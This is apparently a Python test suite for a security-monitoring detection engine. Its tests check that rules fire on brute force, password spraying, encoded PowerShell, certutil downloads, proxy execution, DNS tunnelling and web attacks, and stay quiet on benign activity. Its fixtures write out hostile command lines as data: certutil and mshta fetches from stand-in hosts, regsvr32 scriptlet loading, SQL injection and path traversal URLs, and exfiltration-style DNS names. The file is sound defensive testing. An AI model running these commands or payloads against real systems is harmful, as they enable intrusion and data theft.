"""Detection rules: every rule has a positive (fires) and a negative (stays quiet) test,
plus engine behaviour (windows, ordering, merging, retro-hunt, learning periods)."""

import uuid
from datetime import UTC, datetime, timedelta
from typing import Any

import pytest
from sqlmodel import Session, col, select

from app import attack
from app.detection.conditions import ConditionError, compile_condition, shannon_entropy
from app.detection.engine import Engine
from app.detection.loader import load_rules, sync_rules
from app.detection.schema import RuleSpec
from app.ingest.dedup import DedupKeyer
from app.ingest.normalise import finalise
from app.ingest.pipeline import store_chunk
from app.ingest.types import NormalizedEvent, Parsed
from app.services import settings as settings_service
from app.storage.models import Alert, AlertEvent, Outcome, Rule

MON_10AM = datetime(2026, 10, 19, 10, 0, tzinfo=UTC)  # a Monday, inside business hours
MON_2AM = datetime(2026, 10, 19, 2, 0, tzinfo=UTC)


def ev(ts: datetime, **fields: Any) -> NormalizedEvent:
    fields.setdefault("source_type", "linux_auth")
    fields.setdefault("host", "web01")
    tags = fields.pop("tags", [])
    extra = fields.pop("extra", {})
    e = NormalizedEvent(timestamp=ts, raw=f"synthetic {uuid.uuid4()}", tags=list(tags), **fields)
    e.extra.update(extra)
    return finalise(e)


class Harness:
    def __init__(self, db: Session) -> None:
        self.db = db
        rules = load_rules()
        sync_rules(db, rules)
        self.engine = Engine(s for s, _ in rules)

    def ingest(self, events: list[NormalizedEvent]) -> list[int]:
        counts = store_chunk(self.db, None, [Parsed(e) for e in events], DedupKeyer())
        return self.engine.on_ingest(self.db, counts.inserted_ids)

    def alerts(self, rule_id: str) -> list[Alert]:
        self.db.expire_all()
        return list(
            self.db.exec(select(Alert).where(Alert.rule_id == rule_id).order_by(col(Alert.id)))
        )


@pytest.fixture
def h(db: Session) -> Harness:
    return Harness(db)


def failures(
    n: int,
    start: datetime,
    *,
    ip: str = "203.0.113.50",
    users: list[str] | None = None,
    step: timedelta = timedelta(seconds=10),
    action: str = "ssh_login",
) -> list[NormalizedEvent]:
    users = users or ["root"]
    return [
        ev(
            start + i * step,
            action=action,
            outcome=Outcome.failure,
            src_ip=ip,
            user=users[i % len(users)],
        )
        for i in range(n)
    ]


# ============================================================ rule pack integrity


def test_every_rule_loads_and_has_positive_and_negative_tests() -> None:
    ids = {spec.id for spec, _ in load_rules()}
    tested = {name.split("__")[1] for name in globals() if name.startswith("test_rule__")}
    tested_ids = {t.replace("_", "-") for t in tested}
    for rid in ids:
        assert f"{rid}" in tested_ids, f"no tests for {rid}"
    # each tested rule needs both a fires and a quiet test
    for t in tested:
        assert f"test_rule__{t}__fires" in globals(), t
        assert f"test_rule__{t}__quiet" in globals(), t


@pytest.mark.parametrize("spec", [s for s, _ in load_rules()], ids=lambda s: s.id)
def test_attack_mapping_is_valid_in_pinned_matrix(spec: RuleSpec) -> None:
    if spec.attack is None:
        assert "hunting" in spec.tags or "severity_from_wazuh" in spec.tags
        return
    tactic_names = {t.shortname for t in attack.tactics()}
    assert spec.attack.tactic in tactic_names, (
        f"{spec.attack.tactic} not in ATT&CK {attack.version()}"
    )
    covered: set[str] = set()
    for tid in spec.attack.techniques:
        t = attack.technique(tid)
        assert t is not None, f"{tid} does not exist in ATT&CK {attack.version()}"
        assert not t.deprecated, f"{tid} is deprecated"
        assert not t.revoked, f"{tid} is revoked in ATT&CK {attack.version()}; use {t.revoked_by}"
        covered.update(t.tactics)
    assert spec.attack.tactic in covered, (
        f"{spec.id}: primary tactic {spec.attack.tactic} is not a tactic of {spec.attack.techniques}"
    )


# ============================================================ rules


# -- brute force


def test_rule__sig_auth_brute_force__fires(h: Harness) -> None:
    h.ingest(failures(10, MON_10AM))
    [a] = h.alerts("sig-auth-brute-force")
    assert a.src_ip == "203.0.113.50"
    assert a.event_count == 10
    assert a.match_context["count"] == 10
    assert a.match_context["window"] == "5m"


def test_rule__sig_auth_brute_force__quiet(h: Harness) -> None:
    # 7 failures (below 8), and 10 failures spread over 2 hours: both quiet.
    h.ingest(failures(7, MON_10AM))
    h.ingest(
        failures(10, MON_10AM + timedelta(hours=3), ip="198.51.100.1", step=timedelta(minutes=12))
    )
    assert h.alerts("sig-auth-brute-force") == []


def test_brute_force_rdp_windows_events_also_count(h: Harness) -> None:
    events = [
        ev(
            MON_10AM + timedelta(seconds=i),
            source_type="windows_security",
            action="logon",
            outcome=Outcome.failure,
            src_ip="203.0.113.77",
            user="administrator",
            event_code="4625",
        )
        for i in range(9)
    ]
    h.ingest(events)
    assert len(h.alerts("sig-auth-brute-force")) == 1


# -- password spray


def test_rule__sig_auth_password_spray__fires(h: Harness) -> None:
    users = ["alice", "bob", "carol", "dave", "erin", "frank"]
    h.ingest(failures(6, MON_10AM, users=users, step=timedelta(minutes=1)))
    [a] = h.alerts("sig-auth-password-spray")
    assert a.match_context["distinct"] == 6
    assert a.match_context["distinct_field"] == "user"


def test_rule__sig_auth_password_spray__quiet(h: Harness) -> None:
    # Many failures but only two accounts: brute force, not spraying.
    h.ingest(failures(20, MON_10AM, users=["alice", "bob"]))
    assert h.alerts("sig-auth-password-spray") == []


# -- success after brute force


def test_rule__sig_auth_success_after_brute_force__fires(h: Harness) -> None:
    events = failures(6, MON_10AM)
    events.append(
        ev(
            MON_10AM + timedelta(minutes=5),
            action="ssh_login",
            outcome=Outcome.success,
            src_ip="203.0.113.50",
            user="deploy",
        )
    )
    h.ingest(events)
    [a] = h.alerts("sig-auth-success-after-brute-force")
    assert a.severity == "critical"
    assert a.user == "deploy"  # the account that got in, not the one being guessed
    steps = a.match_context["steps"]
    assert steps[0]["name"] == "failed logons"
    assert steps[0]["count"] == 6
    assert a.event_count == 7


def test_rule__sig_auth_success_after_brute_force__quiet(h: Harness) -> None:
    # Success BEFORE the failures, too few failures, and success from another IP.
    events = [ev(MON_10AM, action="ssh_login", outcome=Outcome.success, src_ip="203.0.113.50")]
    events += failures(6, MON_10AM + timedelta(minutes=1))
    events += failures(3, MON_10AM, ip="198.51.100.2")
    events.append(
        ev(
            MON_10AM + timedelta(minutes=2),
            action="ssh_login",
            outcome=Outcome.success,
            src_ip="198.51.100.2",
        )
    )
    events.append(
        ev(
            MON_10AM + timedelta(minutes=3),
            action="ssh_login",
            outcome=Outcome.success,
            src_ip="10.0.0.9",
        )
    )
    h.ingest(events)
    assert h.alerts("sig-auth-success-after-brute-force") == []


def test_sequence_respects_the_window(h: Harness) -> None:
    events = failures(6, MON_10AM)
    events.append(
        ev(
            MON_10AM + timedelta(hours=2),
            action="ssh_login",
            outcome=Outcome.success,
            src_ip="203.0.113.50",
        )
    )
    h.ingest(events)
    assert h.alerts("sig-auth-success-after-brute-force") == []


# -- off-hours privileged


def test_rule__sig_priv_off_hours__fires(h: Harness) -> None:
    h.ingest(
        [
            ev(
                MON_2AM,
                source_type="windows_security",
                action="special_privileges_assigned",
                outcome=Outcome.success,
                user="jdoe",
                event_code="4672",
                tags=["privileged"],
            ),
            ev(MON_2AM, action="sudo_command", outcome=Outcome.success, user="deploy", host="db01"),
        ]
    )
    alerts = h.alerts("sig-priv-off-hours")
    assert {a.user for a in alerts} == {"jdoe", "deploy"}
    assert any(m["op"] == "off_hours" for m in alerts[0].match_context["matched"])


def test_rule__sig_priv_off_hours__quiet(h: Harness) -> None:
    h.ingest(
        [
            # in business hours
            ev(MON_10AM, action="sudo_command", outcome=Outcome.success, user="deploy"),
            # off hours but SYSTEM / machine accounts
            ev(
                MON_2AM,
                source_type="windows_security",
                action="special_privileges_assigned",
                user="ws-07$",
                event_code="4672",
                tags=["privileged", "system_account"],
            ),
            # off hours but sudo failed
            ev(MON_2AM, action="sudo_command", outcome=Outcome.failure, user="alice"),
        ]
    )
    assert h.alerts("sig-priv-off-hours") == []


def test_business_hours_follow_settings_timezone(h: Harness) -> None:
    # 10:00 UTC Monday is 03:00 in Los Angeles → off hours there.
    settings_service.put_detection(
        h.db, settings_service.DetectionSettings(business_timezone="America/Los_Angeles")
    )
    h.ingest([ev(MON_10AM, action="sudo_command", outcome=Outcome.success, user="deploy")])
    assert len(h.alerts("sig-priv-off-hours")) == 1


# -- new account


def test_rule__sig_persist_new_account__fires(h: Harness) -> None:
    h.ingest(
        [
            ev(MON_10AM, action="user_created", outcome=Outcome.success, user="svc-backup"),
            ev(
                MON_10AM,
                source_type="windows_security",
                host="ws-07",
                action="user_created",
                outcome=Outcome.success,
                user="helpdesk2",
                event_code="4720",
            ),
        ]
    )
    assert {a.user for a in h.alerts("sig-persist-new-account")} == {"svc-backup", "helpdesk2"}


def test_rule__sig_persist_new_account__quiet(h: Harness) -> None:
    h.ingest(
        [
            ev(MON_10AM, action="user_deleted", user="old"),
            ev(MON_10AM, action="group_created", extra={"group": "devs"}),
        ]
    )
    assert h.alerts("sig-persist-new-account") == []


# -- admin group


def test_rule__sig_persist_admin_group__fires(h: Harness) -> None:
    h.ingest(
        [
            ev(
                MON_10AM,
                action="group_member_added",
                user="svc-backup",
                extra={"group": "sudo"},
                tags=["privileged_group"],
            ),
            ev(
                MON_10AM,
                source_type="windows_security",
                host="ws-07",
                action="group_member_added",
                extra={"group": "Administrators", "member_sid": "S-1-5-21-9-1005"},
                tags=["privileged_group"],
                event_code="4732",
            ),
        ]
    )
    assert len(h.alerts("sig-persist-admin-group")) == 2


def test_rule__sig_persist_admin_group__quiet(h: Harness) -> None:
    h.ingest([ev(MON_10AM, action="group_member_added", user="bob", extra={"group": "docker"})])
    assert h.alerts("sig-persist-admin-group") == []


# -- encoded powershell


B64 = "SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkA"


def win_proc(
    ts: datetime, name: str, cmd: str, parent: str = "explorer.exe", **kw: Any
) -> NormalizedEvent:
    return ev(
        ts,
        source_type="sysmon",
        host="ws-07",
        action="process_created",
        outcome=Outcome.success,
        process_name=name,
        process_cmdline=cmd,
        parent_process=parent,
        user="jdoe",
        event_code="1",
        **kw,
    )


@pytest.mark.parametrize(
    "cmd",
    [
        f"powershell.exe -NoP -W Hidden -enc {B64}",
        f"powershell.exe -EncodedCommand {B64}",
        f"powershell -e {B64}",
        f"pwsh.exe /enc {B64}",
        "powershell.exe -c " + "A" * 160,
    ],
)
def test_rule__sig_exec_encoded_powershell__fires(h: Harness, cmd: str) -> None:
    name = "pwsh.exe" if cmd.startswith("pwsh") else "powershell.exe"
    h.ingest([win_proc(MON_10AM, name, cmd)])
    [a] = h.alerts("sig-exec-encoded-powershell")
    assert a.match_context["matched"][-1]["op"] == "re"


@pytest.mark.parametrize(
    ("name", "cmd"),
    [
        ("powershell.exe", "powershell.exe -ExecutionPolicy Bypass -File C:\\scripts\\backup.ps1"),
        ("powershell.exe", "powershell.exe -Command Get-Process -Name explorer"),
        ("cmd.exe", f"cmd.exe /c echo {B64}"),  # base64 but not PowerShell
    ],
)
def test_rule__sig_exec_encoded_powershell__quiet(h: Harness, name: str, cmd: str) -> None:
    h.ingest([win_proc(MON_10AM, name, cmd)])
    assert h.alerts("sig-exec-encoded-powershell") == []


# -- certutil


@pytest.mark.parametrize(
    "cmd",
    [
        "certutil.exe -urlcache -split -f http://203.0.113.80/a.txt C:\\Users\\Public\\a.exe",
        "certutil -verifyctl -f -split https://evil.example/x.bin",
        "certutil -decode payload.b64 payload.exe",
    ],
)
def test_rule__sig_c2_certutil_download__fires(h: Harness, cmd: str) -> None:
    h.ingest([win_proc(MON_10AM, "certutil.exe", cmd)])
    assert len(h.alerts("sig-c2-certutil-download")) == 1


@pytest.mark.parametrize(
    "cmd", ["certutil -hashfile setup.exe SHA256", "certutil -store my", "certutil -urlcache"]
)
def test_rule__sig_c2_certutil_download__quiet(h: Harness, cmd: str) -> None:
    h.ingest([win_proc(MON_10AM, "certutil.exe", cmd)])
    assert h.alerts("sig-c2-certutil-download") == []


# -- proxy execution


@pytest.mark.parametrize(
    ("name", "cmd"),
    [
        ("mshta.exe", "mshta.exe http://203.0.113.80/update.hta"),
        ("regsvr32.exe", "regsvr32 /s /n /u /i:http://203.0.113.80/file.sct scrobj.dll"),
        ("rundll32.exe", 'rundll32.exe javascript:"\\..\\mshtml,RunHTMLApplication ";alert(1)'),
    ],
)
def test_rule__sig_def_proxy_execution__fires(h: Harness, name: str, cmd: str) -> None:
    h.ingest([win_proc(MON_10AM, name, cmd)])
    assert len(h.alerts("sig-def-proxy-execution")) == 1


@pytest.mark.parametrize(
    ("name", "cmd"),
    [
        ("rundll32.exe", "rundll32.exe shell32.dll,Control_RunDLL desk.cpl"),
        ("regsvr32.exe", "regsvr32 /s C:\\Program Files\\App\\plugin.dll"),
        ("chrome.exe", "chrome.exe https://example.com"),
    ],
)
def test_rule__sig_def_proxy_execution__quiet(h: Harness, name: str, cmd: str) -> None:
    h.ingest([win_proc(MON_10AM, name, cmd)])
    assert h.alerts("sig-def-proxy-execution") == []


# -- log cleared


def test_rule__sig_def_log_cleared__fires(h: Harness) -> None:
    h.ingest(
        [
            ev(
                MON_10AM,
                source_type="windows_security",
                host="ws-07",
                action="log_cleared",
                outcome=Outcome.success,
                user="jdoe",
                event_code="1102",
            )
        ]
    )
    [a] = h.alerts("sig-def-log-cleared")
    assert a.host == "ws-07"


def test_rule__sig_def_log_cleared__quiet(h: Harness) -> None:
    h.ingest(
        [ev(MON_10AM, source_type="windows_security", action="windows_event", event_code="104")]
    )
    assert h.alerts("sig-def-log-cleared") == []


# -- office child shell


def test_rule__sig_exec_office_child_shell__fires(h: Harness) -> None:
    h.ingest([win_proc(MON_10AM, "powershell.exe", "powershell -nop", parent="winword.exe")])
    [a] = h.alerts("sig-exec-office-child-shell")
    assert {m["field"] for m in a.match_context["matched"]} == {"parent_process", "process_name"}


def test_rule__sig_exec_office_child_shell__quiet(h: Harness) -> None:
    h.ingest(
        [
            win_proc(MON_10AM, "splwow64.exe", "splwow64.exe 8192", parent="winword.exe"),
            win_proc(MON_10AM, "powershell.exe", "powershell", parent="explorer.exe"),
        ]
    )
    assert h.alerts("sig-exec-office-child-shell") == []


# -- DNS tunnelling


def dns(ts: datetime, q: str, host: str = "ws-07") -> NormalizedEvent:
    return ev(
        ts,
        source_type="sysmon",
        host=host,
        action="dns_query",
        outcome=Outcome.success,
        dns_query=q,
        process_name="upd.exe",
        event_code="22",
    )


def test_rule__sig_exfil_dns_tunnel__fires(h: Harness) -> None:
    chunks = [
        "aGVsbG8gd29ybGQgdGhpcyBpcyBhIHNlY3JldCBkb2N1bWVudA",
        "cGFzc3dvcmRzLnR4dCBhbmQgbW9yZSBkYXRhIGdvZXMgaGVyZQ",
    ]
    h.ingest(
        [
            dns(
                MON_10AM + timedelta(seconds=5 * i),
                f"{chunks[i % 2]}{i:03d}.x{i}.exfil-example.net",
            )
            for i in range(12)
        ]
    )
    [a] = h.alerts("sig-exfil-dns-tunnel")
    assert a.match_context["group"] == {"host": "ws-07", "dns_domain": "exfil-example.net"}


def test_rule__sig_exfil_dns_tunnel__quiet(h: Harness) -> None:
    names = [
        "www.google.com",
        "login.microsoftonline.com",
        "outlook.office365.com",
        "update.googleapis.com",
        "cdn.jsdelivr.net",
    ]
    h.ingest([dns(MON_10AM + timedelta(seconds=i), names[i % 5]) for i in range(50)])
    # long but only a few: under the threshold
    h.ingest([dns(MON_10AM, f"{'q' * 50}{i}.rare.example.org") for i in range(3)])
    assert h.alerts("sig-exfil-dns-tunnel") == []


def test_rule__sig_exfil_dns_volume__fires(h: Harness) -> None:
    h.ingest([dns(MON_10AM + timedelta(seconds=i), f"a{i}.chatty.example") for i in range(160)])
    assert len(h.alerts("sig-exfil-dns-volume")) == 1


def test_rule__sig_exfil_dns_volume__quiet(h: Harness) -> None:
    h.ingest([dns(MON_10AM + timedelta(seconds=i * 3), f"a{i}.chatty.example") for i in range(160)])
    assert h.alerts("sig-exfil-dns-volume") == []  # spread over 8 minutes, window is 5


# -- web attacks


def web(
    ts: datetime, url: str, ua: str = "Mozilla/5.0", ip: str = "198.51.100.7"
) -> NormalizedEvent:
    return ev(
        ts,
        source_type="web_access",
        action="http_request",
        src_ip=ip,
        url=url,
        user_agent=ua,
        http_status=404,
    )


@pytest.mark.parametrize(
    ("url", "ua"),
    [
        ("/products.php?id=1%27%20OR%201=1--", "Mozilla/5.0"),
        ("/search?q=1 UNION ALL SELECT username,password FROM users", "Mozilla/5.0"),
        ("/item?id=1;WAITFOR DELAY '0:0:5'", "Mozilla/5.0"),
        ("/../../etc/passwd", "Mozilla/5.0"),
        ("/download?f=..%2f..%2fwin.ini", "Mozilla/5.0"),
        ("/", "sqlmap/1.8.4#stable (https://sqlmap.org)"),
        ("/admin", "Mozilla/5.00 (Nikto/2.5.0) (Evasions:None) (Test:000003)"),
    ],
)
def test_rule__sig_web_attack_patterns__fires(h: Harness, url: str, ua: str) -> None:
    h.ingest([web(MON_10AM, url, ua)])
    assert len(h.alerts("sig-web-attack-patterns")) == 1


@pytest.mark.parametrize(
    ("url", "ua"),
    [
        ("/blog/the-union-of-design-and-select-materials", "Mozilla/5.0"),
        ("/search?q=O%27Reilly+books", "Mozilla/5.0"),
        ("/static/app.js?v=12", "curl/8.4.0"),
    ],
)
def test_rule__sig_web_attack_patterns__quiet(h: Harness, url: str, ua: str) -> None:
    h.ingest([web(MON_10AM, url, ua)])
    assert h.alerts("sig-web-attack-patterns") == []


def test_web_attacks_from_one_ip_merge_into_one_alert(h: Harness) -> None:
    h.ingest(
        [web(MON_10AM + timedelta(seconds=i), f"/x?id=1%27%20OR%201=1--{i}") for i in range(30)]
    )
    [a] = h.alerts("sig-web-attack-patterns")
    assert a.event_count == 30


# -- first seen


def test_rule__sig_hunt_first_seen_process__fires(h: Harness) -> None:
    # Two days of history on the host, then a never-seen binary.
    h.ingest([win_proc(MON_10AM - timedelta(days=2), "explorer.exe", "explorer.exe")])
    h.ingest([win_proc(MON_10AM, "mimikatz.exe", "mimikatz.exe")])
    [a] = h.alerts("sig-hunt-first-seen-process")
    assert a.match_context["value"] == {"process_name": "mimikatz.exe"}


def test_rule__sig_hunt_first_seen_process__quiet(h: Harness) -> None:
    # Learning period: everything on a brand-new host is first-seen, nothing alerts.
    h.ingest([win_proc(MON_10AM + timedelta(minutes=i), f"tool{i}.exe", "x") for i in range(5)])
    # Known process seen again later: no alert.
    h.ingest([win_proc(MON_10AM + timedelta(days=3), "tool1.exe", "x")])
    assert h.alerts("sig-hunt-first-seen-process") == []


# -- wazuh passthrough


def test_rule__sig_wazuh_high_severity__fires(h: Harness) -> None:
    h.ingest(
        [
            ev(
                MON_10AM,
                source_type="wazuh",
                action="wazuh_alert",
                tags=["wazuh"],
                extra={"wazuh": {"level": 13, "severity": "critical", "rule_id": "92057"}},
            )
        ]
    )
    [a] = h.alerts("sig-wazuh-high-severity")
    assert a.severity == "critical"


def test_rule__sig_wazuh_high_severity__quiet(h: Harness) -> None:
    h.ingest(
        [
            ev(
                MON_10AM,
                source_type="wazuh",
                action="wazuh_alert",
                tags=["wazuh"],
                extra={"wazuh": {"level": 7, "severity": "medium", "rule_id": "5716"}},
            )
        ]
    )
    assert h.alerts("sig-wazuh-high-severity") == []


# ============================================================ engine behaviour


def test_out_of_order_ingest_gives_the_same_alert(h: Harness) -> None:
    events = failures(10, MON_10AM)
    h.ingest(events[5:])  # later half first (5 events: below threshold)
    assert h.alerts("sig-auth-brute-force") == []
    h.ingest(events[:5])  # then the older half arrives
    [a] = h.alerts("sig-auth-brute-force")
    assert a.event_count == 10
    assert a.first_event_at == MON_10AM


def test_continuing_attack_extends_one_alert(h: Harness) -> None:
    h.ingest(failures(10, MON_10AM))
    h.ingest(failures(10, MON_10AM + timedelta(minutes=2)))
    [a] = h.alerts("sig-auth-brute-force")
    assert a.event_count == 20
    rule = h.db.get(Rule, "sig-auth-brute-force")
    assert rule is not None
    assert rule.hit_count == 1
    assert rule.last_fired_at is not None


def test_retro_hunt_is_idempotent_and_finds_history(h: Harness, db: Session) -> None:
    rule = db.get(Rule, "sig-auth-brute-force")
    assert rule is not None
    rule.enabled = False
    db.add(rule)
    db.commit()
    h.ingest(failures(10, MON_10AM))
    assert h.alerts("sig-auth-brute-force") == []  # rule was off at ingest time

    window = (MON_10AM - timedelta(hours=1), MON_10AM + timedelta(hours=1))
    first = h.engine.retro_hunt(db, "sig-auth-brute-force", *window)
    assert first == {"events_scanned": 10, "alerts": 1}
    h.engine.retro_hunt(db, "sig-auth-brute-force", *window)
    [a] = h.alerts("sig-auth-brute-force")
    assert a.event_count == 10
    links = db.exec(select(AlertEvent).where(AlertEvent.alert_id == a.id)).all()
    assert len(links) == 10


def test_disabled_rules_do_not_run(h: Harness, db: Session) -> None:
    rule = db.get(Rule, "sig-def-log-cleared")
    assert rule is not None
    rule.enabled = False
    db.add(rule)
    db.commit()
    h.ingest([ev(MON_10AM, action="log_cleared", event_code="1102")])
    assert h.alerts("sig-def-log-cleared") == []


def test_alert_hooks_receive_alert_ids(h: Harness) -> None:
    got: list[int] = []
    h.engine.alert_hooks.append(lambda _db, ids: got.extend(ids))
    h.ingest([ev(MON_10AM, action="log_cleared", event_code="1102")])
    assert len(got) == 1


# ============================================================ conditions


def test_condition_errors_surface_at_load_time() -> None:
    with pytest.raises(ConditionError, match="unknown field"):
        compile_condition({"usr": "x"})
    with pytest.raises(ConditionError, match="unknown modifier"):
        compile_condition({"user|fuzzy": "x"})
    with pytest.raises(ConditionError, match="invalid regex"):
        compile_condition({"user|re": "("})
    with pytest.raises(ConditionError, match="only key"):
        compile_condition({"all": [{"user": "x"}], "host": "y"})


def test_condition_semantics() -> None:
    from app.detection.conditions import EvalContext

    pred = compile_condition(
        {
            "all": [
                {"user": "ALICE"},  # case-insensitive by default
                {"src_ip|cidr": "10.0.0.0/8"},
                {"not": {"tags|contains": "noise"}},
                {"extra.logon_type|gte": 10},
            ]
        }
    )
    good = {"user": "alice", "src_ip": "10.1.2.3", "tags": ["rdp"], "extra": {"logon_type": 10}}
    hits = pred(good, EvalContext())
    assert hits is not None
    assert [x.field for x in hits] == ["user", "src_ip", "extra.logon_type"]
    assert pred({**good, "tags": ["noise"]}, EvalContext()) is None
    assert pred({**good, "src_ip": "192.168.1.1"}, EvalContext()) is None


def test_entropy() -> None:
    assert shannon_entropy("aaaaaaaa") == 0
    assert shannon_entropy("aGVsbG8gd29ybGQgdGhpcw") > 3.8
